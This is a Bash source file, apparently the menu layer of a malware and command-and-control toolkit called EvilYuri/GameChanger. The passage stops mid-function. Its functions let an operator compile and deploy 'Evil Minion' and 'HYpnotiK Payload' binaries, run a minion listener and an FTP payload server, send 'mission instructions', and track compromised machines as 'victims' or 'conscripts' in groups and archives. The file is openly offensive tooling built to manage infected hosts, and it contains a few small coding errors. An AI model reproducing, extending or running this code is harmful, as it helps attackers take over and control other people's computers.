#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# ACTIONS

# TODO
function action_set_evil_minion_source_file () {
    local MINION_FILES=( `find "${MD_DEFAULT['minion-dir']}" -type f` )
    local FILE_NAMES=()
    for fl_path in ${MINION_FILES[@]}; do
        local TRUNCATED=`basename "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done

    local MINION=`fetch_selection_from_user 'EvilMinion' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$MINION" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    # TODO - Handle /bin compiled minion files
    local MINION_PATH="${MD_DEFAULT['minion-dir']}/${PAYLOAD}"
    set_out_file "$MINION_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set Evil Minion as"\
            "(${RED}GameChanger${RESET})"\
            "out file. (${RED}$MINION_PATH${RESET})"
    else
        ok_msg "Successfully set HYpnotiK Payload as"\
            "(${GREEN}GameChanger${RESET})"\
            "out file. (${GREEN}$MINION_PATH${RESET})"
    fi
    return $EXIT_CODE
}

# TODO
function action_set_hypnotik_payload_source_file () {
    local PAYLOAD_FILES=( `find "${MD_DEFAULT['payload-dir']}" -type f` )
    local FILE_NAMES=()
    for fl_path in ${PAYLOAD_FILES[@]}; do
        local TRUNCATED=`basename "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local PAYLOAD=`fetch_selection_from_user 'HYpnotiKPayload' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$PAYLOAD" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    # TODO - Handle /bin compiled payload files
    local PAYLOAD_PATH="${MD_DEFAULT['payload-dir']}/${PAYLOAD}"
    set_out_file "$PAYLOAD_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set HYpnotiK Payload as"\
            "(${RED}GameChanger${RESET})"\
            "out file. (${RED}$PAYLOAD_PATH${RESET})"
    else
        ok_msg "Successfully set HYpnotiK Payload as"\
            "(${GREEN}GameChanger${RESET})"\
            "out file. (${GREEN}$PAYLOAD_PATH${RESET})"
    fi
    return $EXIT_CODE
}

function action_set_out_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        local FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exist."
            echo
        fi; break
    done
    set_out_file "$FILE_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}Game Changer${RESET}) out file."
    else
        ok_msg "Successfully set out file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_victim_identifiers () {
    echo; info_msg "Type conscript record identifiers separated by commas"\
        "or (${MAGENTA}.back${RESET})."
    local SUGGESTED_ID=`generate_conscript_id`
    info_msg "Recommended new Conscript ID (${GREEN}$SUGGESTED_ID${RESET})"
    symbol_msg "${BLUE}EXAMPLE${RESET}" "Conscript1,Conscript2,..."
    local CONSCRIPT_IDS=`fetch_data_from_user 'ConscriptIDs'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_victim_identifiers "$CONSCRIPT_IDS"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set conscript identifiers"\
            "(${RED}$CONSCRIPT_IDS${RESET})."
    else
        ok_msg "Successfully set conscript identifiers"\
            "(${GREEN}$CONSCRIPT_IDS${RESET})."
    fi
    return $EXIT_CODE
}

function action_register_victims () {
    while :
    do
        display_action_register_victims_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_register_victims_data_set
    done
    ARGUMENTS=( `format_evil_yuri_register_victims_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Deploy Minion arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_conscript_commander () {
    while :
    do
        display_action_conscript_commander_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_conscript_commander_data_set
    done
    ARGUMENTS=(
        `format_evil_yuri_conscript_commander_arguments \
            "$CONSCRIPT_ID" "$PAPERTRAIL_FLAG"`
    )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Conscript Commander arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_search_conscript_archives () {
    while :
    do
        display_action_search_archives_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_search_archives_data_set
    done
    ARGUMENTS=( `format_evil_yuri_search_archives_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Search Conscript Archives arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_search_victim_records () {
    while :
    do
        display_action_search_victim_records_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_search_victim_records_data_set
    done
    ARGUMENTS=( `format_evil_yuri_search_victims_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Search Conscripts arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}


function action_delete_conscript_group () {
    while :
    do
        display_action_delete_group_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_delete_group_data_set
    done
    ARGUMENTS=( `format_evil_yuri_delete_group_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Delete Conscript Group arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_create_conscript_group () {
    while :
    do
        display_action_create_group_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_create_group_data_set
    done
    ARGUMENTS=( `format_evil_yuri_create_group_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Create Conscript Group arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_search_conscript_groups () {
    while :
    do
        display_action_search_groups_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_search_groups_data_set
    done
    ARGUMENTS=( `format_evil_yuri_search_groups_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Search Conscript Groups arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_group_conscripts () {
    while :
    do
        display_action_group_conscripts_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_group_conscripts_data_set
    done
    ARGUMENTS=( `format_evil_yuri_group_conscripts_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Groups Conscripts arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_delete_conscript_archive () {
    while :
    do
        display_action_delete_archive_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_delete_archive_data_set
    done
    ARGUMENTS=( `format_evil_yuri_delete_archive_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Delete Conscript Archive arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_archive_conscripts () {
    while :
    do
        display_action_archive_conscripts_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_archive_conscripts_data_set
    done
    ARGUMENTS=( `format_evil_yuri_archive_conscripts_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Archive Conscripts arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_compile_evil_minion () {
    while :
    do
        display_action_compile_minion_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_compile_minion_data_set
    done
    ARGUMENTS=( `format_game_changer_compile_script_arguments` )
    debug_msg "(${BLUE}GameChanger${RESET}) Compile Script arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['game-changer']} ${ARGUMENTS[@]}
    return $?
}

function action_compile_hypnotik_payload () {
    while :
    do
        display_action_compile_payload_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_compile_payload_data_set
    done
    ARGUMENTS=( `format_game_changer_compile_script_arguments` )
    debug_msg "(${BLUE}GameChanger${RESET}) Compile Script arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['game-changer']} ${ARGUMENTS[@]}
    return $?
}

function action_setup_payload_ftp_server () {
    while :
    do
        display_action_setup_payload_ftp_server_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_setup_payload_ftp_server_data_set
    done
    ARGUMENTS=( `format_evil_yuri_setup_ftp_server_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Setup FTP Payload Server arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_start_minion_listener () {
    while :
    do
        display_action_start_minion_listener_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_start_minion_listener_data_set
    done
    ARGUMENTS=( `format_evil_yuri_start_minion_listener_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Start Minion Listener arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_deploy_evil_minion () {
    while :
    do
        display_action_deploy_minion_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_deploy_minion_data_set
    done
    ARGUMENTS=( `format_evil_yuri_deploy_minion_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Deploy Minion arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_deploy_hypnotik_payload () {
    while :
    do
        display_action_deploy_payload_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_deploy_payload_data_set
    done
    ARGUMENTS=( `format_evil_yuri_deploy_payload_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Deploy HYpnotiK Payload arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_mission_instruction () {
    while :
    do
        display_action_mission_instruction_data_set; echo
        fetch_ultimatum_from_user "Modify data set? ${YELLOW}Y/N${RESET}"
        if [ $? -ne 0 ]; then
            break
        fi
        modify_action_mission_instruction_data_set
    done
    ARGUMENTS=( `format_evil_yuri_mission_instruction_arguments` )
    debug_msg "(${BLUE}$SCRIPT_NAME${RESET}) Mission Instruction arguments"\
        "(${MAGENTA}${ARGUMENTS[@]}${RESET})"
    clear; ${MD_CARGO['evil-yuri']} ${ARGUMENTS[@]}
    return $?
}

function action_rename_binary_payload () {
    echo; info_msg "Renaming compiled HYpnotik Payload binary -"
    local BIN_PAYLOAD_FILES=( `fetch_all_directory_files ${MD_DEFAULT['payload-dir']}/bin` )
    local FILE_NAMES=()
    for fl_path in ${BIN_PAYLOAD_FILES[@]}; do
        local TRUNCATED=`fetch_file_name_from_path "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local BIN_MINION=`fetch_selection_from_user 'HYpnotiKPayload' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$BIN_MINION" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local BIN_PAYLOAD_PATH="${MD_DEFAULT['payload-dir']}/bin/${BIN_MINION}"
    echo; info_msg "Type new file name or (${MAGENTA}.back${RESET}) -"
    local NEW_NAME=`fetch_data_from_user 'FileName'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local NEW_PATH="${MD_DEFAULT['payload-dir']}/bin/${NEW_NAME}"
    mv "$BIN_PAYLOAD_PATH" "$NEW_PATH" &> /dev/null
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong!"\
            "Could not rename HYpnotiK Payload compiled binary"\
            "(${RED}$BIN_PAYLOAD${RESET})"
    else
        ok_msg "Successfully renamed HYpnotiK Payload compiled binary"\
            "(${GREEN}$BIN_PAYLOAD${RESET}) to (${GREEN}$NEW_NAME${RESET})"
    fi
    return $EXIT_CODE
}

function action_remove_binary_payload () {
    echo; info_msg "Removing compiled HYpnotiK Payload binary -"
    local BIN_PAYLOAD_FILES=( `fetch_all_directory_files ${MD_DEFAULT['payload-dir']}/bin` )
    local FILE_NAMES=()
    for fl_path in ${BIN_PAYLOAD_FILES[@]}; do
        local TRUNCATED=`fetch_file_name_from_path "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local BIN_PAYLOAD=`fetch_selection_from_user 'HYpnotiKPayload' \
        'Remove-All' ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$BIN_PAYLOAD" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local BIN_PAYLOAD_PATH="${MD_DEFAULT['minion-dir']}/bin/${BIN_PAYLOAD}"
    if [[ "$BIN_PAYLOAD" == 'Remove-All' ]]; then
        rm -f "${MD_DEFAULT['payload-dir']}/bin/*" &> /dev/null
        local EXIT_CODE=$?
        if [ $EXIT_CODE -ne 0 ]; then
            nok_msg "Something went wrong!"\
                "Could not remove all HYpnotiK Payload binaries."
        else
            ok_msg "Successfully removed all HYpnotiK Payload binaries!"
        fi
        return $EXIT_CODE
    fi
    rm -f "$BIN_PAYLOAD_PATH" &> /dev/null
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong!"\
            "Could not remove HYpnotiK Payload compiled binary"\
            "(${RED}$BIN_PAYLOAD${RESET})"
    else
        ok_msg "Successfully removed HYpnotiK Payload compiled binary"\
            "(${GREEN}$BIN_PAYLOAD${RESET})"
    fi
    return $EXIT_CODE
}

function action_export_binary_payload () {
    echo; info_msg "Exporting compiled HYpnotiK Payload binary -"
    local BIN_PAYLOAD_FILES=( `fetch_all_directory_files ${MD_DEFAULT['payload-dir']}/bin` )
    local FILE_NAMES=()
    for fl_path in ${BIN_PAYLOAD_FILES[@]}; do
        local TRUNCATED=`fetch_file_name_from_path "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local BIN_PAYLOAD=`fetch_selection_from_user 'HYpnotiKPayload' \
        'Export-All' ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$BIN_PAYLOAD" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local BIN_PAYLOAD_PATH="${MD_DEFAULT['minion-dir']}/bin/${BIN_PAYLOAD}"
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET}) -"
    while :
    do
        local TARGET_DIR=`fetch_data_from_user 'TargetDirectory'`
        echo; if [ $? -ne 0 ]; then
            info_msg "Aborting action."
            return 1
        elif [ ! -d "$TARGET_DIR" ]; then
            warning_msg "Directory (${RED}$TARGET_DIR${RESET}) not found!"
            continue
        fi
        break
    done
    if [[ "$BIN_PAYLOAD" == 'Export-All' ]]; then
        cp -r "${MD_DEFAULT['payload-dir']}/bin/*" "$TARGET_DIR" &> /dev/null
        local EXIT_CODE=$?
        if [ $EXIT_CODE -ne 0 ]; then
            nok_msg "Something went wrong!"\
                "Could not export all HYpnotiK Payload binaries to"\
                "(${RED}$TARGET_DIR${RESET})"
        else
            ok_msg "Successfully exported all HYpnotiK Payload binaries to"\
                 "(${GREEN}$TARGET_DIR${RESET})"
        fi
        return $EXIT_CODE
    fi
    cp -r "$BIN_PAYLOAD_PATH" "$TARGET_DIR" &> /dev/null
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong!"\
            "Could not export HYpnotiK Payload compiled binary"\
            "(${RED}$BIN_PAYLOAD${RESET}) to target directory"\
            "(${BLUE}$TARGET_DIR${RESET})"
    else
        ok_msg "Successfully exported HYpnotiK Payload compiled binary"\
            "(${GREEN}$BIN_PAYLOAD${RESET}) to target directory"\
            "(${BLUE}$TARGET_DIR${RESET})"
    fi
    return $EXIT_CODE
}

function action_rename_binary_minion () {
    echo; info_msg "Renaming compiled Evil Minion binary -"
    local BIN_MINION_FILES=( `fetch_all_directory_files ${MD_DEFAULT['minion-dir']}/bin` )
    local FILE_NAMES=()
    for fl_path in ${BIN_MINION_FILES[@]}; do
        local TRUNCATED=`fetch_file_name_from_path "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local BIN_MINION=`fetch_selection_from_user 'EvilMinion' \
        ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$BIN_MINION" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local BIN_MINION_PATH="${MD_DEFAULT['minion-dir']}/bin/${BIN_MINION}"
    echo; info_msg "Type new file name or (${MAGENTA}.back${RESET}) -"
    local NEW_NAME=`fetch_data_from_user 'FileName'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local NEW_PATH="${MD_DEFAULT['minion-dir']}/bin/${NEW_NAME}"
    mv "$BIN_MINION_PATH" "$NEW_PATH" &> /dev/null
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong!"\
            "Could not rename Evil Minion compiled binary"\
            "(${RED}$BIN_MINION${RESET})"
    else
        ok_msg "Successfully renamed Evil Minion compiled binary"\
            "(${GREEN}$BIN_MINION${RESET}) to (${GREEN}$NEW_NAME${RESET})"
    fi
    return $EXIT_CODE
}

function action_remove_binary_minion () {
    echo; info_msg "Removing compiled Evil Minion binary -"
    local BIN_MINION_FILES=( `fetch_all_directory_files ${MD_DEFAULT['minion-dir']}/bin` )
    local FILE_NAMES=()
    for fl_path in ${BIN_MINION_FILES[@]}; do
        local TRUNCATED=`fetch_file_name_from_path "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local BIN_MINION=`fetch_selection_from_user 'EvilMinion' \
        'Remove-All' ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$BIN_MINION" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local BIN_MINION_PATH="${MD_DEFAULT['minion-dir']}/bin/${BIN_MINION}"
    if [[ "$BIN_MINION" == 'Remove-All' ]]; then
        rm -f "${MD_DEFAULT['minion-dir']}/bin/*" &> /dev/null
        local EXIT_CODE=$?
        if [ $EXIT_CODE -ne 0 ]; then
            nok_msg "Something went wrong!"\
                "Could not remove all Evil Minion binaries."
        else
            ok_msg "Successfully removed all Evil Minion binaries!"
        fi
        return $EXIT_CODE
    fi
    rm -f "$BIN_MINION_PATH" &> /dev/null
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong!"\
            "Could not remove Evil Minion compiled binary"\
            "(${RED}$BIN_MINION${RESET})"
    else
        ok_msg "Successfully removed Evil Minion compiled binary"\
            "(${GREEN}$BIN_MINION${RESET})"
    fi
    return $EXIT_CODE
}

function action_export_binary_minion () {
    echo; info_msg "Exporting compiled Evil Minion binary -"
    local BIN_MINION_FILES=( `fetch_all_directory_files ${MD_DEFAULT['minion-dir']}/bin` )
    local FILE_NAMES=()
    for fl_path in ${BIN_MINION_FILES[@]}; do
        local TRUNCATED=`fetch_file_name_from_path "$fl_path"`
        local FILE_NAMES=( ${FILE_NAMES[@]} "$TRUNCATED" )
    done
    local BIN_MINION=`fetch_selection_from_user 'EvilMinion' \
        'Export-All' ${FILE_NAMES[@]}`
    if [ $? -ne 0 ] || [ -z "$BIN_MINION" ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    local BIN_MINION_PATH="${MD_DEFAULT['minion-dir']}/bin/${BIN_MINION}"
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET}) -"
    while :
    do
        local TARGET_DIR=`fetch_data_from_user 'TargetDirectory'`
        echo; if [ $? -ne 0 ]; then
            info_msg "Aborting action."
            return 1
        elif [ ! -d "$TARGET_DIR" ]; then
            warning_msg "Directory (${RED}$TARGET_DIR${RESET}) not found!"
            continue
        fi
        break
    done
    if [[ "$BIN_MINION" == 'Export-All' ]]; then
        cp -r "${MD_DEFAULT['minion-dir']}/bin/*" "$TARGET_DIR" &> /dev/null
        local EXIT_CODE=$?
        if [ $EXIT_CODE -ne 0 ]; then
            nok_msg "Something went wrong!"\
                "Could not export all Evil Minion binaries to"\
                "(${RED}$TARGET_DIR${RESET})"
        else
            ok_msg "Successfully exported all Evil Minion binaries to"\
                 "(${GREEN}$TARGET_DIR${RESET})"
        fi
        return $EXIT_CODE
    fi
    cp -r "$BIN_MINION_PATH" "$TARGET_DIR" &> /dev/null
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong!"\
            "Could not export Evil Minion compiled binary"\
            "(${RED}$BIN_MINION${RESET}) to target directory"\
            "(${BLUE}$TARGET_DIR${RESET})"
    else
        ok_msg "Successfully exported Evil Minion compiled binary"\
            "(${GREEN}$BIN_MINION${RESET}) to target directory"\
            "(${BLUE}$TARGET_DIR${RESET})"
    fi
    return $EXIT_CODE
}

function action_manage_victim_groups () {
    echo
    local USER_SELECTION=`fetch_selection_from_user 'Groups' \
        'Group-Conscripts' 'Search-Groups' 'Create-Group' 'Delete-Group'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    case "$USER_SELECTION" in
        'Group-Conscripts')
            action_group_conscripts
            ;;
        'Search-Groups')
            action_search_conscript_groups
            ;;
        'Create-Group')
            action_create_conscript_group
            ;;
        'Delete-Group')
            action_delete_conscript_group
            ;;
        *)
            echo "[ ERROR ]: Illegal value (${RED}$USER_SELECTION${RESET})"
            return 2
            ;;
    esac
    return $?
}

function action_manage_binary_minions () {
    echo
    local USER_SELECTION=`fetch_selection_from_user 'Minion' \
        'Rename' 'Remove' 'Export'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    case "$USER_SELECTION" in
        'Rename')
            action_rename_binary_minion
            ;;
        'Remove')
            action_remove_binary_minion
            ;;
        'Export')
            action_export_binary_minion
            ;;
        *)
            echo "[ ERROR ]: Illegal value (${RED}$USER_SELECTION${RESET})"
            return 2
            ;;
    esac
    return $?
}

function action_manage_binary_payloads () {
    echo
    local USER_SELECTION=`fetch_selection_from_user 'Payload' \
        'Rename' 'Remove' 'Export'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    case "$USER_SELECTION" in
        'Rename')
            action_rename_binary_payload
            ;;
        'Remove')
            action_remove_binary_payload
            ;;
        'Export')
            action_export_binary_payload
            ;;
        *)
            echo "[ ERROR ]: Illegal value (${RED}$USER_SELECTION${RESET})"
            return 2
            ;;
    esac
    return $?
}

function action_manage_victim_archives () {
    echo
    local USER_SELECTION=`fetch_selection_from_user 'Archives' \
        'Archive-Conscripts' 'Search-Archive' 'Delete-Archive'`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 1
    fi
    case "$USER_SELECTION" in
        'Archive-Conscripts')
            action_archive_conscripts
            ;;
        'Search-Archive')
            action_search_conscript_archives
            ;;
        'Delete-Archive')
            action_delete_conscript_archive
            ;;
        *)
            echo "[ ERROR ]: Illegal value (${RED}$USER_SELECTION${RESET})"
            return 2
            ;;
    esac
    return $?
}

function action_set_victim_directory () {
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET})."
    while :
    do
        local DIR_PATH=`fetch_data_from_user 'DirectoryPath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_directory_exists "$DIR_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "Directory (${RED}$DIR_PATH${RESET}) does not exists."
            echo
        fi; break
    done
    set_victim_directory "$DIR_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$DIR_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) victim directory."
    else
        ok_msg "Successfully set victim directory (${GREEN}$DIR_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_conscript_index_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        local FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exist."
            echo
        fi; break
    done
    set_conscript_index_file "$FILE_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) conscript index file."
    else
        ok_msg "Successfully set conscript index file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_archive_index_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        local FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exist."
            echo
        fi; break
    done
    set_archive_index_file "$FILE_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) archive index file."
    else
        ok_msg "Successfully set archive index file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_group_index_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        local FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exist."
            echo
        fi; break
    done
    set_group_index_file "$FILE_PATH"
    local EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) group index file."
    else
        ok_msg "Successfully set group index file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_source_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        local FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exist."
            echo
        fi; break
    done
